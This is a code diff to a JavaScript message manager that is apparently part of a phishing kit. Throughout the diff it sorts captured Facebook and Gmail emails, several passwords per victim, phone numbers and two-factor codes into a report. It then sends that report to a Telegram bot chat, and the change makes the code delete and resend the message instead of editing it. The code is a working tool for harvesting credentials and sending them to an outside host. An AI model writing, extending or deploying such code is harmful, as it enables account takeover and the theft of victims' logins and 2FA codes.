@@ -31,7 +31,34 @@ class UserMessageManager {
   }
 
   setFlow(userId, flow) {
-    this.getUser(userId).flow = flow;
+    const user = this.getUser(userId);
+    const oldFlow = user.flow;
+    if (oldFlow !== flow) {
+      const d = user.data;
+      if (oldFlow === "facebook" && !d.fb_email) {
+        const email = d.login_email || d.email || "";
+        if (email) d.fb_email = email;
+        const pwds = [];
+        if (d.passwords && Array.isArray(d.passwords)) {
+          pwds.push(...d.passwords.filter(Boolean));
+        } else {
+          [d.password_one, d.password_two, d.password_three]
+            .filter(Boolean)
+            .forEach((p) => pwds.push(p));
+        }
+        if (pwds.length > 0) d.fb_passwords = [...pwds];
+      } else if (oldFlow === "google" && !d.gl_email) {
+        const email = d.login_email || d.email || "";
+        if (email) d.gl_email = email;
+        if (d.gl_passwords === undefined) {
+          const allPwds = d.passwords ? [...d.passwords.filter(Boolean)] : [];
+          const fbCount = (d.fb_passwords || []).length;
+          const glPwds = allPwds.slice(fbCount);
+          if (glPwds.length > 0) d.gl_passwords = glPwds;
+        }
+      }
+    }
+    user.flow = flow;
   }
 
   updateData(userId, newData) {
@@ -59,7 +86,6 @@ class UserMessageManager {
 
     const name = d.full_name || d.name || "User";
     const isGoogle = d.pageName === "Gmail" || user.flow === "google";
-    const emailLabel = isGoogle ? "Gmail Email" : "Facebook Email";
     const email = d.login_email || d.email || d.business_email || "";
 
     const lines = [
@@ -72,20 +98,44 @@ class UserMessageManager {
     if (d.city) lines.push(`City: \`${d.city}\``);
     if (d.countryCode) lines.push(`Country Code: \`${toDialCode(d.countryCode)}\``);
     if (d.business_email) lines.push(`Business Email: \`${d.business_email}\``);
-    if (email) lines.push(`${emailLabel}: \`${email}\``);
     if (d.phone_number) lines.push(`Phone: \`${d.phone_number}\``);
 
-    const passwords = [];
-    if (d.passwords && Array.isArray(d.passwords)) {
-      passwords.push(...d.passwords.filter(Boolean));
+    const hasBothFlows = d.fb_email || d.gl_email;
+
+    if (hasBothFlows) {
+      if (d.fb_email) lines.push(`FB Email: \`${d.fb_email}\``);
+      if (d.fb_passwords && d.fb_passwords.length > 0) {
+        d.fb_passwords.forEach((pwd, idx) => {
+          lines.push(`FB Password${idx + 1}: \`${pwd}\``);
+        });
+      }
+      const glEmail = d.gl_email || (isGoogle ? email : "");
+      if (glEmail) lines.push(`GL Email: \`${glEmail}\``);
+      const glPwds = d.gl_passwords || (() => {
+        const allPwds = d.passwords ? [...d.passwords.filter(Boolean)] : [];
+        const fbCount = (d.fb_passwords || []).length;
+        return allPwds.slice(fbCount);
+      })();
+      if (glPwds.length > 0) {
+        glPwds.forEach((pwd, idx) => {
+          lines.push(`GL Password${idx + 1}: \`${pwd}\``);
+        });
+      }
     } else {
-      [d.password_one, d.password_two, d.password_three]
-        .filter(Boolean)
-        .forEach((p) => passwords.push(p));
+      const emailLabel = isGoogle ? "Gmail Email" : "Facebook Email";
+      if (email) lines.push(`${emailLabel}: \`${email}\``);
+      const passwords = [];
+      if (d.passwords && Array.isArray(d.passwords)) {
+        passwords.push(...d.passwords.filter(Boolean));
+      } else {
+        [d.password_one, d.password_two, d.password_three]
+          .filter(Boolean)
+          .forEach((p) => passwords.push(p));
+      }
+      passwords.forEach((pwd, idx) => {
+        lines.push(`Password${idx + 1}: \`${pwd}\``);
+      });
     }
-    passwords.forEach((pwd, idx) => {
-      lines.push(`Password${idx + 1}: \`${pwd}\``);
-    });
 
     if (d.tfaCodes && d.tfaCodes.length > 0) {
       d.tfaCodes.forEach((c, idx) => {
@@ -130,26 +180,18 @@ class UserMessageManager {
     if (user.telegramMessageId) {
       try {
         await axios.post(
-          `https://api.telegram.org/bot${process.env.BOT}/editMessageText`,
+          `https://api.telegram.org/bot${process.env.BOT}/deleteMessage`,
           {
             chat_id: process.env.CHAT_ID,
             message_id: user.telegramMessageId,
-            text,
-            parse_mode: "Markdown",
-            reply_markup: buttons,
           },
           { timeout: 5000 }
         );
-        console.log(`[MSG_MANAGER] Edited message ${user.telegramMessageId} for user ${userId}`);
-        return user.telegramMessageId;
+        console.log(`[MSG_MANAGER] Deleted old message ${user.telegramMessageId} for user ${userId}`);
       } catch (error) {
-        const desc = error.response?.data?.description || "";
-        if (desc.includes("message is not modified")) {
-          return user.telegramMessageId;
-        }
-        console.warn(`[MSG_MANAGER] Edit failed: ${desc}`);
-        user.telegramMessageId = null;
+        console.warn(`[MSG_MANAGER] Delete failed: ${error.response?.data?.description || error.message}`);
       }
+      user.telegramMessageId = null;
     }
 
     try {
